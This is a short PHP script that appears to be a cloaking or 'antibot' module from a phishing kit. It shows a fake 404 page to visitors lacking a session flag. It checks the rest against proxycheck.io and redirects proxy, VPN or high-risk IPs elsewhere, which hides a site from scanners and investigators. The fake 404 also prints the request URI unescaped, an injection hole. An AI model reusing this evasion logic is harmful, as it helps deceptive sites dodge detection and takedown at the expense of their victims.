<?php

error_reporting(0);
session_start();

if (!isset($_SESSION['redi_watch'])) {
header("HTTP/1.0 404 Not Found");
exit("<h1>Not Found</h1>
The requested URL " . $_SERVER["REQUEST_URI"] . " was not found on this server.
<hr>");
}

$ip = 
  isset($_SERVER["HTTP_CF_CONNECTING_IP"])?
     $_SERVER["HTTP_CF_CONNECTING_IP"]:
     $_SERVER["REMOTE_ADDR"]
  ;

$homepage = file_get_contents('http://proxycheck.io/v2/'.$ip.'?risk=1&vpn=1');
$json_obj = json_decode($homepage);

if ($json_obj->$ip->proxy == "yes"){
   	if ($failed_url == true){
	    require($errorpage);
	    exit();
	}else{
	header('Location: ' . $multiple_url);
    exit();
	}
}

if ($activate_proxy_risk == true){
    if ($json_obj->$ip->risk >= $proxy_risk){
    	if ($failed_url == true){
	    require($errorpage);
	    exit();
	}else{
	header('Location: ' . $multiple_url);
    exit();
	}
        
    }
}

?>